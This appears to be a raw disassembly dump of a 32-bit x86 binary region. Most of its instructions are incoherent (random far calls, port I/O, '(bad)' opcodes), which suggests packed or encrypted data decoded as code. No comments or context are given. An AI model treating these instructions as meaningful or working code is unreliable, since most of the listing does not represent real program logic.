  41a36f:	adc    eax,0x7afa03ac
  41a374:	call   0x9fd2:0x72645ea4
  41a37b:	sar    esi,1
  41a37d:	pop    eax
  41a37e:	adc    esi,esp
  41a380:	pop    es
  41a381:	xor    DWORD PTR [eax-0xd6548c4],ebx
  41a387:	ja     0x41a396
  41a389:	icebp  
  41a38a:	ins    DWORD PTR es:[edi],dx
  41a38b:	das    
  41a38c:	das    
  41a38d:	or     esi,DWORD PTR [eax+0x60650cbb]
  41a393:	scas   eax,DWORD PTR es:[edi]
  41a394:	jne    0x41a403
  41a396:	mov    ds:0x74e1f68f,al
  41a39b:	inc    ebx
  41a39c:	in     eax,dx
  41a39d:	mov    esi,0xf90c542
  41a3a2:	enter  0x29b4,0xa5
  41a3a6:	call   0xd86a:0xf05d9e1e
  41a3ad:	dec    esi
  41a3ae:	jb     0x41a357
  41a3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3b1:	out    0xa5,al
  41a3b3:	int3   
  41a3b4:	mov    esi,0xaeb54ac9
  41a3b9:	enter  0x7288,0x92
  41a3bd:	dec    esp
  41a3be:	push   ecx
  41a3bf:	cmp    BYTE PTR [ebp-0x28],bl
  41a3c2:	cmp    ecx,ebp
  41a3c4:	sbb    ah,dl
  41a3c6:	imul   edi,DWORD PTR [esi-0x58952ad0],0xffffff83
  41a3cd:	adc    ebp,edi
  41a3cf:	or     al,0xe
  41a3d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3d2:	fst    QWORD PTR [ebx]
  41a3d4:	dec    edx
  41a3d5:	inc    ebp
  41a3d6:	scas   al,BYTE PTR es:[edi]
  41a3d7:	out    0x7f,eax
  41a3d9:	pop    ebx
  41a3da:	cmp    al,0x71
  41a3dc:	ins    DWORD PTR es:[edi],dx
  41a3dd:	mov    bl,0x68
  41a3df:	mov    ebx,esp
  41a3e1:	retf   0xee0
  41a3e4:	cmp    esi,DWORD PTR [edi+0x37a7cded]
  41a3ea:	cs repnz cmp ebx,0xffffffa0
  41a3ef:	adc    DWORD PTR [ecx-0x2a],0x5b67aca9
  41a3f6:	loop   0x41a3f2
  41a3f8:	cld    
  41a3f9:	dec    esi
  41a3fa:	test   eax,0x9e65c551
  41a3ff:	dec    edi
  41a400:	mov    edi,0x8c5ed1b6
  41a405:	jge    0x41a3dd
  41a407:	retf   
  41a408:	adc    eax,0x21a6eaf3
  41a40d:	mov    DWORD PTR [ebx+0x53],ebx
  41a410:	xchg   BYTE PTR [eax-0x7b],ah
  41a413:	imul   eax,ebp,0xfffffff5
  41a416:	clc    
  41a417:	inc    edx
  41a418:	adc    esp,DWORD PTR [ecx+0x5b12189f]
  41a41e:	shl    DWORD PTR ds:0xa6104ab1,cl
  41a424:	cmp    esp,DWORD PTR [edx+0x32c3d9e]
  41a42a:	xchg   ebx,esp
  41a42c:	call   0x82df0547
  41a431:	rol    BYTE PTR [eax+0x32],0x7b
  41a435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a436:	cmc    
  41a437:	fsubr  QWORD PTR [ecx+0x7d]
  41a43a:	shr    bh,1
  41a43c:	out    0xbb,eax
  41a43e:	ins    BYTE PTR es:[edi],dx
  41a43f:	pusha  
  41a440:	test   DWORD PTR [esi+0x4],0xef088ffd
  41a447:	pop    esp
  41a448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a449:	adc    al,BYTE PTR [ecx-0x4b]
  41a44c:	cmp    al,0x88
  41a44e:	xor    esi,DWORD PTR [eax]
  41a450:	not    ebx
  41a452:	in     al,0x76
  41a454:	xchg   esi,eax
  41a455:	dec    ebx
  41a456:	out    0xaa,al
  41a458:	mov    edx,?
  41a45a:	ror    DWORD PTR [eax],cl
  41a45c:	in     eax,dx
  41a45d:	test   eax,0x7f4cc40f
  41a462:	dec    edi
  41a463:	lea    ebx,[ebp+0x6e]
  41a466:	add    eax,0xa283bccc
  41a46b:	pop    es
  41a46c:	das    
  41a46d:	retf   
  41a46e:	cdq    
  41a46f:	pop    ebp
  41a470:	dec    ecx
  41a471:	fisttp DWORD PTR [esi]
  41a473:	ret    0x95b0
  41a476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a477:	push   0x6f
  41a479:	jae    0x41a437
  41a47b:	in     eax,0xa4
  41a47d:	xor    DWORD PTR [eax],ecx
  41a47f:	jae    0x41a48f
  41a481:	and    dh,dl
  41a483:	or     edx,DWORD PTR [edx+ebx*4]
  41a486:	pop    esi
  41a487:	je     0x41a42d
  41a489:	sbb    edx,DWORD PTR [edx-0x28]
  41a48c:	jp     0x41a4dd
  41a48e:	sub    ebp,0x3845fa13
  41a494:	cld    
  41a495:	sub    eax,0x3598160f
  41a49a:	jmp    0x9d0cf32d
  41a49f:	inc    edi
  41a4a0:	push   ebx
  41a4a1:	stc    
  41a4a2:	mov    ecx,esp
  41a4a4:	pop    edi
  41a4a5:	(bad)  
  41a4a6:	rol    BYTE PTR [ebx],1
  41a4a8:	push   es
  41a4a9:	loopne 0x41a4d0
  41a4ab:	adc    ebp,edi
  41a4ad:	scas   al,BYTE PTR es:[edi]
  41a4ae:	xlat   BYTE PTR ds:[ebx]
  41a4af:	shl    BYTE PTR [esi-0x3c4387b4],1
  41a4b5:	inc    edx
  41a4b6:	xchg   esp,eax
  41a4b7:	sub    eax,0xf238da4
  41a4bc:	in     eax,0x31
  41a4be:	xor    ebx,DWORD PTR [ebx]
  41a4c0:	rol    DWORD PTR es:[ebp-0x3b],0x24
  41a4c5:	fcmove st,st(1)
  41a4c7:	or     eax,0x33044a46
  41a4cc:	xchg   edi,eax
  41a4cd:	jmp    0x28a70515
  41a4d2:	imul   edi,DWORD PTR [edx],0xffffff80
  41a4d5:	mov    ah,0x5e
  41a4d7:	call   0x63fd:0x45736c3f
  41a4de:	add    eax,0x8b8c05c1
  41a4e3:	scas   al,BYTE PTR es:[edi]
  41a4e4:	out    dx,al
  41a4e5:	mov    esi,0x7b13d178
  41a4ea:	int    0xb4
  41a4ec:	push   0x2e
  41a4ee:	cmc    
  41a4ef:	test   ebp,ebx
  41a4f1:	add    ecx,esi
  41a4f3:	lods   al,BYTE PTR ds:[esi]
  41a4f4:	xchg   BYTE PTR ds:0x7a5092c3,al
  41a4fa:	loope  0x41a556
  41a4fc:	nop
  41a4fd:	add    BYTE PTR [ebp+0x13],dl
  41a500:	pop    edi
  41a501:	mov    dl,0x51
  41a503:	mov    ebx,0x3ca4f460
  41a508:	push   edx
  41a509:	mov    al,ds:0xc79e8b55
  41a50e:	sti    
  41a50f:	mov    ds:0x63650cbc,al
  41a514:	adc    al,BYTE PTR [ebp-0x44]
  41a517:	adc    ebp,DWORD PTR [ecx+0x1d]
  41a51a:	cmp    BYTE PTR [edi+0x406e86d],0x4f
  41a521:	(bad)  
  41a522:	(bad)  
  41a523:	popf   
  41a524:	add    BYTE PTR [edi+0x78],cl
  41a527:	lods   al,BYTE PTR gs:[esi]
  41a529:	outs   dx,DWORD PTR ds:[esi]
  41a52a:	xor    BYTE PTR cs:[eax-0x77],0x36
  41a52f:	pusha  
  41a530:	out    0x3f,al
  41a532:	popf   
  41a533:	int    0xdb
  41a535:	or     edx,DWORD PTR [edi-0x10]
  41a538:	and    BYTE PTR [edi-0x227641df],cl
  41a53e:	push   0x7b
  41a540:	mov    eax,0x23ff2b95
  41a545:	or     dh,ah
  41a547:	es ret 
  41a549:	push   ebx
  41a54a:	mov    esp,edi
  41a54c:	mov    ebp,0x2a95a82f
  41a551:	push   ds
  41a552:	scas   al,BYTE PTR es:[edi]
  41a553:	(bad)  
  41a554:	xchg   esi,eax
  41a555:	or     ecx,esi
  41a557:	mul    dl
  41a559:	aaa    
  41a55a:	loope  0x41a4e7
  41a55c:	adc    DWORD PTR [edi-0x3b],esi
  41a55f:	mov    edi,0xb43bb1a2
  41a564:	or     DWORD PTR [eax-0x4f],0x9a07227d
  41a56b:	jno    0x41a4f0
  41a56d:	add    cl,BYTE PTR [ecx+0x56]
  41a570:	adc    ebx,DWORD PTR [edi-0x4c]
  41a573:	enter  0xcb32,0x6b
  41a577:	not    ebp
  41a579:	lahf   
  41a57a:	inc    ebx
  41a57b:	sbb    DWORD PTR [esi+0x5f],esi
  41a57e:	out    dx,eax
  41a57f:	push   edx
  41a580:	push   edi
  41a581:	lods   al,BYTE PTR ds:[esi]
  41a582:	fld    QWORD PTR ss:[eax+0x3]
  41a586:	push   0x236738bd
  41a58b:	xchg   DWORD PTR [esi+ebp*2],ebx
  41a58e:	fs xchg edx,eax
  41a590:	outs   dx,BYTE PTR ds:[esi]
  41a591:	rcl    DWORD PTR [edi],1
  41a593:	push   esi
  41a594:	xchg   edx,eax
  41a595:	cmp    ecx,DWORD PTR [ecx-0x524f8001]
  41a59b:	push   cs
  41a59c:	lods   eax,DWORD PTR ds:[esi]
  41a59d:	fild   WORD PTR [esi-0x59926643]
  41a5a3:	repz cmp al,bh
  41a5a6:	popa   
  41a5a7:	int3   
  41a5a8:	sti    
  41a5a9:	pop    edx
  41a5aa:	push   ecx
  41a5ab:	loopne 0x41a5e7
  41a5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5ae:	pop    ss
  41a5af:	jns    0x41a5c8
  41a5b1:	xor    DWORD PTR [ebx-0x40281037],eax
  41a5b7:	outs   dx,BYTE PTR ds:[esi]
  41a5b8:	xchg   ebx,eax
  41a5b9:	xchg   BYTE PTR [ebp+0x2c79ded9],cl
  41a5bf:	inc    eax
  41a5c0:	and    ch,BYTE PTR [eax-0x782d31de]
  41a5c6:	push   ds
  41a5c7:	jp     0x41a553
  41a5c9:	mov    ch,ah
  41a5cb:	mov    ebx,ds
  41a5cd:	jno    0x41a594
  41a5cf:	mov    edx,DWORD PTR [esi]
  41a5d1:	test   esi,edx
  41a5d3:	or     dl,BYTE PTR [eax]
  41a5d5:	(bad)  
  41a5d6:	int    0x52
  41a5d8:	dec    eax
  41a5d9:	xchg   DWORD PTR [ecx+eax*1+0x7a],ebp
  41a5dd:	leave  
  41a5de:	add    BYTE PTR [edi+0x17],bh
  41a5e1:	or     ch,al
  41a5e3:	mov    ?,WORD PTR [ebx-0x7]
  41a5e6:	xchg   ebp,eax
  41a5e7:	retf   
  41a5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5e9:	(bad)  
  41a5ea:	cmp    dh,bh
  41a5ec:	outs   dx,DWORD PTR ds:[esi]
  41a5ed:	fwait
  41a5ee:	daa    
  41a5ef:	popf   
  41a5f0:	mov    eax,ds:0x7f83e110
  41a5f5:	(bad)  
  41a5f6:	sbb    esi,ebp
  41a5f8:	in     al,0x85
  41a5fa:	xchg   ebp,eax
  41a5fb:	fnstcw WORD PTR [ecx-0x4f]
  41a5fe:	inc    ecx
  41a5ff:	mov    dl,0x3b
  41a601:	call   0xd239:0xcb7a746d
  41a608:	out    0x53,eax
  41a60a:	and    al,BYTE PTR [esi+0x2542dcac]
  41a610:	jbe    0x41a668
  41a612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a613:	sbb    BYTE PTR ds:0xc8a01ad5,ch
  41a619:	inc    esi
  41a61a:	aas    
  41a61b:	xor    esi,ecx
  41a61d:	leave  
  41a61e:	xchg   edi,eax
  41a61f:	clc    
  41a620:	xor    al,0x28
  41a622:	fbld   TBYTE PTR [edi-0x47]
  41a625:	ja     0x41a5c2
  41a627:	pop    ebp
  41a628:	(bad)  
  41a629:	mov    dl,0xbc
  41a62b:	or     eax,DWORD PTR [ecx+0x36]
  41a62e:	stc    
  41a62f:	std    
  41a630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a631:	rol    bl,cl
  41a633:	in     eax,0x9c
  41a635:	add    eax,0x1d5fdc21
  41a63a:	es nop
  41a63c:	mov    ah,0x0
  41a63e:	add    bl,BYTE PTR [edi+0x4eefe224]
  41a644:	shr    BYTE PTR [edx+0x2a],0x20
  41a648:	mov    cl,0xbf
  41a64a:	popa   
  41a64b:	mov    ecx,0xbaf8bda7
  41a650:	lods   eax,DWORD PTR ds:[esi]
  41a651:	loop   0x41a6b9
  41a653:	sbb    DWORD PTR [eax+0x5c],ebx
  41a656:	inc    ebx
  41a657:	dec    ebx
  41a658:	mov    ch,0xcb
  41a65a:	fs sbb al,0x23
  41a65d:	push   esp
  41a65e:	dec    edx
  41a65f:	call   0x2567542d
  41a664:	out    dx,eax
  41a665:	xor    BYTE PTR [ecx],dl
  41a667:	mov    ds:0xb40b31bc,eax
  41a66c:	dec    esp
  41a66d:	push   edx
  41a66e:	dec    edx
  41a66f:	sub    eax,DWORD PTR [edx]
  41a671:	rcl    BYTE PTR [eax],1
  41a673:	xor    al,0x86
  41a675:	fild   QWORD PTR [eax-0x78]
  41a678:	pop    ebp
  41a679:	jo     0x41a6dd
  41a67b:	mov    ds:0x630dc0ba,al
  41a680:	push   ebp
  41a681:	dec    eax
  41a682:	push   edx
  41a683:	sub    eax,0x8cf5ac08
  41a688:	fs iret 
  41a68a:	add    al,0x68
  41a68c:	dec    eax
  41a68d:	jbe    0x41a6e0
  41a68f:	pop    ebx
  41a690:	sub    eax,DWORD PTR [ecx]
  41a692:	mov    bh,0xd7
  41a694:	mov    DWORD PTR ds:0x584b2d9f,0x4982e5ad
  41a69e:	sub    bh,ah
  41a6a0:	xchg   edi,eax
  41a6a1:	push   ebx
  41a6a2:	and    ah,ah
  41a6a4:	in     al,0x0
  41a6a6:	(bad)  
  41a6a7:	cmp    BYTE PTR [esp+eax*1+0x38],al
  41a6ab:	or     eax,0xbba65510
  41a6b0:	in     al,dx
  41a6b1:	jbe    0x41a6c0
  41a6b3:	pop    ebp
  41a6b4:	test   eax,0x5de0971
  41a6b9:	stos   DWORD PTR es:[edi],eax
  41a6ba:	cmp    eax,0xcd0f11c8
  41a6bf:	pop    ds
  41a6c0:	call   0x8bc4:0xa4f87fac
  41a6c7:	push   0xad5081b
  41a6cc:	js     0x41a691
  41a6ce:	mov    bh,0x1e
  41a6d0:	ja     0x41a713
  41a6d2:	pop    esi
  41a6d3:	out    0xd2,eax
  41a6d5:	inc    esi
  41a6d6:	adc    dh,BYTE PTR ss:[eax+edx*1+0x44ab7577]
  41a6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6df:	es mov ch,0xfc
  41a6e2:	aad    0xea
  41a6e4:	mov    ebp,0x54cb5f91
  41a6e9:	push   edx
  41a6ea:	cdq    
  41a6eb:	push   0x5dc98ebc
  41a6f0:	setp   ah
  41a6f3:	outs   dx,DWORD PTR ds:[esi]
  41a6f4:	cmp    DWORD PTR [ebx-0x20],eax
  41a6f7:	data16 and al,0x4a
  41a6fa:	fxch   st(3)
  41a6fc:	push   edi
  41a6fd:	cld    
  41a6fe:	cmp    al,0xa7
  41a700:	(bad)  
  41a701:	mov    eax,ds:0x7a36d855
  41a706:	(bad)  
  41a708:	fs mov ecx,0x7d8bd033
  41a70e:	lock not DWORD PTR ds:0x42a38d
  41a715:	add    edx,ecx
  41a717:	cmp    edi,edx
  41a719:	mov    DWORD PTR ds:0x42a371,0x6de4
  41a723:	je     0x42299c
  41a729:	push   ebx
  41a72a:	mov    DWORD PTR ds:0x42a2f1,0x24b5
  41a734:	jmp    0x422977
  41a739:	mov    edx,DWORD PTR [ebp-0x8]
  41a73c:	adc    edi,DWORD PTR ds:0x42a3cd
  41a742:	jmp    0x41ac54
  41a747:	retf   
  41a748:	rol    ah,0xc4
  41a74b:	retf   
  41a74c:	(bad)  
  41a74d:	retf   
  41a74e:	(bad)  
  41a74f:	and    edx,eax
  41a751:	adc    al,0x39
  41a753:	fsubrp st(6),st
  41a755:	fst    QWORD PTR [edi]
  41a757:	cmp    DWORD PTR [bx+0x78],0x73
  41a75c:	jl     0x41a7d6
  41a75e:	js     0x41a71a
  41a760:	sub    bl,bl
  41a762:	inc    edi
  41a763:	add    eax,0x14190115
  41a768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a769:	dec    edi
  41a76a:	pop    esi
  41a76b:	or     al,0xfa
  41a76d:	mov    eax,ds:0x90d4705a
  41a772:	ret    0xce33
  41a775:	enter  0x9f09,0x7e
  41a779:	jo     0x41a7b1
  41a77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a77d:	pusha  
  41a77e:	sbb    ch,BYTE PTR [esi+0xe]
  41a781:	push   edx
  41a782:	iret   
  41a783:	inc    edx
  41a784:	out    dx,al
  41a785:	sti    
  41a786:	pop    esi
  41a787:	cmp    al,0x84
  41a789:	pop    ecx
  41a78a:	mov    dh,0x72
  41a78c:	repnz shl eax,1
  41a78f:	loope  0x41a7cf
  41a791:	jle    0x41a77c
  41a793:	jno    0x41a7b7
  41a795:	pop    eax
  41a796:	in     al,0x13
  41a798:	loop   0x41a791
  41a79a:	add    al,0x10
  41a79c:	mov    ch,0x98
  41a79e:	popf   
  41a79f:	adc    bl,dl
  41a7a1:	sti    
  41a7a2:	jns    0x41a72f
  41a7a4:	cmp    DWORD PTR [eax-0x3e],ebp
  41a7a7:	jnp    0x41a7d4
  41a7a9:	retf   0x397
  41a7ac:	xor    BYTE PTR [ebp+ecx*8+0x2608aa38],bl
  41a7b3:	les    esp,FWORD PTR [edx-0x33]
  41a7b6:	sbb    al,0x4
  41a7b8:	psubb  mm2,QWORD PTR [esi]
  41a7bb:	mov    ch,0x3b
  41a7bd:	mov    esp,0xde8ca76e
  41a7c2:	mov    ebx,0x931c4b9e
  41a7c7:	mov    cl,0xa1
  41a7c9:	test   DWORD PTR [edx],ebx
  41a7cb:	xchg   ebx,eax
  41a7cc:	mov    al,ds:0x53d829af
  41a7d1:	pop    ds
  41a7d2:	push   0xe50c5fb
  41a7d7:	pop    esi
  41a7d8:	cdq    
  41a7d9:	fiadd  DWORD PTR [ebx]
  41a7db:	test   al,0xc4
  41a7dd:	xchg   ebp,eax
  41a7de:	in     eax,dx
  41a7df:	push   edi
  41a7e0:	xchg   ebx,eax
  41a7e1:	je     0x41a7c4
  41a7e3:	cmp    esi,ebp
  41a7e5:	cmc    
  41a7e6:	cli    
  41a7e7:	xor    eax,0xff4399e8
  41a7ec:	inc    esi
  41a7ed:	sbb    DWORD PTR [ebx+0x22023611],eax
  41a7f3:	test   al,0xfe
  41a7f5:	mov    esi,DWORD PTR [ebx]
  41a7f7:	test   BYTE PTR [ecx],ah
  41a7f9:	ins    DWORD PTR es:[edi],dx
  41a7fa:	xchg   esp,eax
  41a7fb:	push   ebx
  41a7fc:	cmp    esp,esp
  41a7fe:	aad    0x1c
  41a800:	mov    eax,0x7c51d386
  41a805:	test   DWORD PTR [edi],esp
  41a807:	xor    al,0x1e
  41a809:	and    al,0x2f
  41a80b:	jle    0x41a82a
  41a80d:	mov    ecx,0x4705510d
  41a812:	es inc edx
  41a814:	icebp  
  41a815:	jle    0x41a879
  41a817:	mov    eax,fs
  41a819:	pop    esi
  41a81a:	or     ah,BYTE PTR [eax]
  41a81c:	ret    0xb91a
  41a81f:	and    DWORD PTR [edx+0xb],0x16
  41a823:	mov    ebx,0xe0b2350f
  41a828:	sbb    BYTE PTR ds:0x5b949d37,al
  41a82e:	fbstp  TBYTE PTR [esi+0x55]
  41a831:	inc    ecx
  41a832:	xchg   edi,eax
  41a833:	out    0xac,eax
  41a835:	sbb    bl,0x78
  41a838:	add    al,0xe6
  41a83a:	aas    
  41a83b:	mov    DWORD PTR [ecx+0x52],esi
  41a83e:	add    eax,0xc551f026
  41a843:	or     al,0x75
  41a845:	(bad)  
  41a846:	mov    edi,0x6683667b
  41a84b:	cdq    
  41a84c:	call   FWORD PTR [ecx+0xc9b8c24]
  41a852:	dec    esi
  41a853:	jns    0x41a8a2
  41a855:	xor    ah,cl
  41a857:	inc    ecx
  41a858:	mov    dl,0xfa
  41a85a:	pop    esp
  41a85b:	push   ds
  41a85c:	adc    BYTE PTR [esi],dh
  41a85e:	adc    esp,esi
  41a860:	cwde   
  41a861:	daa    
  41a862:	sbb    edi,DWORD PTR [eax+0x6a1c2bd]
  41a868:	ficom  DWORD PTR [edi+ecx*1-0x5cae2f8b]
  41a86f:	nop
  41a870:	mov    ecx,DWORD PTR [eax]
  41a872:	aad    0x66
  41a874:	mov    eax,0x9ff068bb
  41a879:	or     al,0x95
  41a87b:	fld    DWORD PTR [ebx]
  41a87d:	mov    cl,BYTE PTR [ebp+0x67]
  41a880:	or     edx,DWORD PTR [edi+0x66]
  41a883:	sahf   
  41a884:	pusha  
  41a885:	dec    ebx
  41a886:	sbb    esp,DWORD PTR [ebx]
  41a888:	daa    
  41a889:	cmp    al,0x40
  41a88b:	paddd  mm2,QWORD PTR [ecx]
  41a88e:	xchg   edx,eax
  41a88f:	sub    DWORD PTR [ebx-0xb2d2c06],esi
  41a895:	cmp    eax,0x40b5ed93
  41a89a:	mov    dh,0xb7
  41a89c:	add    al,0x23
  41a89e:	or     eax,0x132788b2
  41a8a3:	repnz add eax,0xe54625ef
  41a8a9:	mov    ds:0xd8cf43a6,al
  41a8ae:	sub    al,0xbe
  41a8b0:	mov    ah,0xac
  41a8b2:	sbb    al,0xd2
  41a8b4:	ss loope 0x41a927
  41a8b7:	out    dx,al
  41a8b8:	mov    ah,0x7b
  41a8ba:	mov    ebx,0x40192f21
  41a8bf:	xor    ebp,DWORD PTR [esi-0x26d262ee]
  41a8c5:	pop    esp
  41a8c6:	push   esi
  41a8c7:	scas   al,BYTE PTR es:[edi]
  41a8c8:	cld    
  41a8c9:	xchg   esp,eax
  41a8ca:	inc    ebp
  41a8cb:	mov    eax,ds:0x3ce62086
  41a8d0:	lock repz xchg edx,eax
  41a8d3:	fwait
  41a8d4:	pop    ds
  41a8d5:	les    esi,FWORD PTR [ecx+ebp*4-0x4a]
  41a8d9:	xlat   BYTE PTR ds:[ebx]
  41a8da:	gs dec edx
  41a8dc:	cmp    bl,0x56
  41a8df:	xchg   ebp,eax
  41a8e1:	in     eax,0x8
  41a8e3:	into   
  41a8e4:	into   
  41a8e5:	sub    eax,0xbf7916aa
  41a8ea:	push   esi
  41a8eb:	xchg   edi,eax
  41a8ec:	ret    
  41a8ed:	ror    BYTE PTR [edx],1
  41a8ef:	jo     0x41a90a
  41a8f1:	imul   esi,DWORD PTR [ebx-0x63d64dfe],0x74
  41a8f8:	pop    edi
  41a8f9:	jmp    0x78f17419
  41a8fe:	repnz and al,0x44
  41a901:	inc    edx
  41a902:	dec    ecx
  41a903:	imul   ebp,DWORD PTR [ecx-0x4d0d1a2b],0x425a1421
  41a90d:	les    edx,FWORD PTR [esi-0x7935b3b0]
  41a913:	shl    DWORD PTR [edx-0x201319ed],cl
  41a919:	cmp    DWORD PTR [eax-0x17],eax
  41a91c:	jmp    0x597f:0x273c0305
  41a923:	xchg   BYTE PTR [ebx],ch
  41a925:	jle    0x41a97f
  41a927:	outs   dx,BYTE PTR ds:[esi]
  41a928:	stc    
  41a929:	xor    dh,dh
  41a92b:	or     ebx,DWORD PTR [ecx+eiz*8-0x326c1f0]
  41a932:	arpl   WORD PTR [esi+ecx*1],dx
  41a935:	push   edx
  41a936:	push   esp
  41a937:	dec    ecx
  41a938:	xor    ebx,0x7
  41a93b:	pop    ecx
  41a93c:	adc    al,0xb8
  41a93e:	mov    bl,0x34
  41a940:	mov    edi,0xcf3fa23d
  41a945:	outs   dx,BYTE PTR ds:[esi]
  41a946:	push   edx
  41a947:	jmp    0x2edd0c77
  41a94c:	rol    dl,1
  41a94e:	add    esp,DWORD PTR [ebp+0x2d]
  41a951:	lods   al,BYTE PTR ds:[esi]
  41a952:	sbb    eax,0x95d5632b
  41a957:	pop    ebp
  41a958:	jle    0x41a999
  41a95a:	gs jmp 0xcbc8:0x5d9f98b
  41a962:	ret    
  41a963:	in     eax,dx
  41a964:	mov    esi,0x1158fe6b
  41a969:	and    DWORD PTR [edx+0x70687f14],ebp
  41a96f:	fwait
  41a970:	push   ebp
  41a971:	outs   dx,DWORD PTR ds:[esi]
  41a972:	ds jmp 0x9876b2e6
  41a978:	dec    eax
  41a979:	mov    ah,0x1b
  41a97b:	mov    dh,0xb0
  41a97d:	push   esp
  41a97e:	arpl   bx,di
  41a980:	scas   eax,DWORD PTR es:[edi]
  41a981:	jge    0x41a925
  41a983:	lds    esi,FWORD PTR [ebx+0x1e]
  41a986:	aad    0xb2
  41a988:	xor    ah,BYTE PTR [esi+0x34]
  41a98b:	shr    BYTE PTR [esi+0xd],1
  41a98e:	js     0x41a9bb
  41a990:	sub    eax,DWORD PTR ds:0x4d287317
  41a996:	push   edi
  41a997:	pop    ebx
  41a998:	clc    
  41a999:	jecxz  0x41a9a1
  41a99b:	pop    esi
  41a99c:	xchg   edx,eax
  41a99d:	sti    
  41a99e:	(bad)  
  41a99f:	mov    esi,0x39910b8b
  41a9a4:	or     eax,0x2c06134f
  41a9a9:	jl     0x41a95b
  41a9ab:	nop
  41a9ac:	mov    edi,0xedf099fa
  41a9b1:	je     0x41a9fd
  41a9b3:	dec    edx
  41a9b4:	dec    eax
  41a9b5:	mov    dh,0xf8
  41a9b7:	or     BYTE PTR [ebx-0x62051a8d],dh
  41a9bd:	adc    al,0x84
  41a9bf:	mov    gs,WORD PTR [edx-0x596dce3]
  41a9c5:	mov    esp,DWORD PTR [esi-0x3b87f75]
  41a9cb:	mov    ch,0xcd
  41a9cd:	cmp    edi,DWORD PTR [ebx+edi*2]
  41a9d0:	mov    dh,0x12
  41a9d2:	pop    ds
  41a9d3:	inc    esi
  41a9d4:	jl     0x41aa0f
  41a9d6:	packssdw mm3,QWORD PTR [esi+0x5a]
  41a9da:	enter  0xc31a,0x79
  41a9de:	stos   BYTE PTR es:[edi],al
  41a9df:	loopne 0x41a9e5
  41a9e1:	dec    eax
  41a9e2:	dec    BYTE PTR ds:0x1592e1ee
  41a9e8:	je     0x41aa08
  41a9ea:	ins    BYTE PTR es:[edi],dx
  41a9eb:	dec    edi
  41a9ec:	pop    ds
  41a9ed:	into   
  41a9ee:	bound  esi,QWORD PTR [ebp-0x51]
  41a9f1:	pop    ds
  41a9f2:	mov    dh,0x51
  41a9f4:	and    ch,bl
  41a9f6:	cld    
  41a9f7:	add    ecx,DWORD PTR [edx]
  41a9f9:	cld    
  41a9fa:	mov    cl,0x8b
  41a9fc:	out    dx,eax
  41a9fd:	xlat   BYTE PTR ds:[ebx]
  41a9fe:	bound  esi,QWORD PTR [ecx+0x46e8b2cd]
  41aa04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa05:	int3   
  41aa06:	shl    ch,1
  41aa08:	test   eax,0x2d1eae58
  41aa0d:	push   ebx
  41aa0e:	fiadd  WORD PTR [esi+0x4e0c751c]
  41aa14:	mov    cl,0x9a
  41aa16:	mov    esi,0x8caf20fb
  41aa1b:	in     al,dx
  41aa1c:	mov    ch,0x5c
  41aa1e:	cmp    DWORD PTR [edx+0x73],0x44
  41aa22:	sub    DWORD PTR [edi-0x7],0x77ee045a
  41aa29:	shl    DWORD PTR [eax-0x1c],0xc5
  41aa2d:	je     0x41aa3f
  41aa2f:	adc    esi,0x6e540501
  41aa35:	pop    esp
  41aa36:	sbb    eax,0x58634311
  41aa3b:	mov    esp,DWORD PTR [ecx*4+0x19635b59]
  41aa42:	cmp    ah,bl
  41aa44:	icebp  
  41aa45:	mov    al,0xa5
  41aa47:	adc    eax,0x852da9eb
  41aa4c:	inc    edx
  41aa4d:	push   eax
  41aa4e:	lods   al,BYTE PTR ds:[esi]
  41aa4f:	out    0xfc,eax
  41aa51:	xor    al,0x30
  41aa53:	int3   
  41aa54:	shr    cl,1
  41aa56:	mov    al,ds:0xd710e058
  41aa5b:	pop    ds
  41aa5c:	cmc    
  41aa5d:	cmp    DWORD PTR [esi],esi
  41aa5f:	aad    0x56
  41aa61:	fist   WORD PTR [ecx]
  41aa63:	dec    esp
  41aa64:	out    dx,al
  41aa65:	popf   
  41aa66:	push   ebx
  41aa67:	jg     0x41aac3
  41aa69:	ins    BYTE PTR es:[edi],dx
  41aa6a:	loope  0x41aae7
  41aa6c:	movss  DWORD PTR [edi+0x25],xmm4
  41aa71:	dec    ecx
  41aa72:	sub    BYTE PTR [ebp+0x12],0xd7
  41aa76:	push   es
  41aa77:	jb     0x41aa65
  41aa79:	or     ebx,DWORD PTR [edx+0x2d]
  41aa7c:	xor    bl,al
  41aa7e:	mov    ecx,DWORD PTR [ecx-0x7b]
  41aa81:	adc    BYTE PTR [ebp+0x24],ch
  41aa84:	enter  0xe279,0x2f
  41aa88:	push   ebp
  41aa89:	int3   
  41aa8a:	imul   edx,DWORD PTR [esi-0x7303522d],0xc31aeaae
  41aa94:	xor    eax,DWORD PTR [esi+0x4fabfb82]
  41aa9a:	popa   
  41aa9b:	push   ss
  41aa9c:	aad    0x85
  41aa9e:	mov    eax,0x1e781dd3
  41aaa3:	mov    ?,eax
  41aaa5:	gs xchg esi,eax
  41aaa7:	scas   al,BYTE PTR es:[edi]
  41aaa8:	arpl   WORD PTR [ebp-0x18c31980],sp
  41aaae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaaf:	cmc    
  41aab0:	int3   
  41aab1:	sub    dl,dh
  41aab3:	rcl    DWORD PTR [ebx+0x7f],0xe0
  41aab7:	test   al,0x24
  41aab9:	addr16 adc al,0x31
  41aabc:	pusha  
  41aabd:	jno    0x41aaf9
  41aabf:	sbb    al,0xca
  41aac1:	aas    
  41aac2:	jbe    0x41aa57
  41aac4:	paddusb mm7,QWORD PTR [edx+edx*4-0x3]
  41aac9:	sbb    cl,BYTE PTR [eax]
  41aacb:	sbb    eax,0xb23e72a
  41aad0:	mov    al,ds:0xabc67e16
  41aad5:	shl    DWORD PTR [esi],1
  41aad7:	sbb    al,0x8d
